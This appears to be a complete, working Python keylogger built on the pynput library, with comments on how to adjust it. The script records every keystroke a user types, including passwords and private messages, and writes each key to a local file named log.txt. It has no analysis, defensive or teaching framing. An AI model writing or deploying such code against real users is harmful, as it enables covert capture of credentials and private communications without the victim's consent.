from pynput.keyboard import Listener
import logging

logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(message)s')


# If you want to log each key in one line use this
def last_char():
    logging.StreamHandler.terminator = ''


# Shift, Enter etc. will log after releasing the key.
# If you want to log them when it pressed change all on_release with on_pressed.
def on_release(key):
    if len(str(key)) == 3:
        logging.info(str(key)[1:2])
    elif 'Key.' in str(key):
        logging.info(str(key)[4:])
    else:
        logging.info('')

    # last_char()


# last_char()

with Listener(on_release=on_release) as listener:
    listener.join()
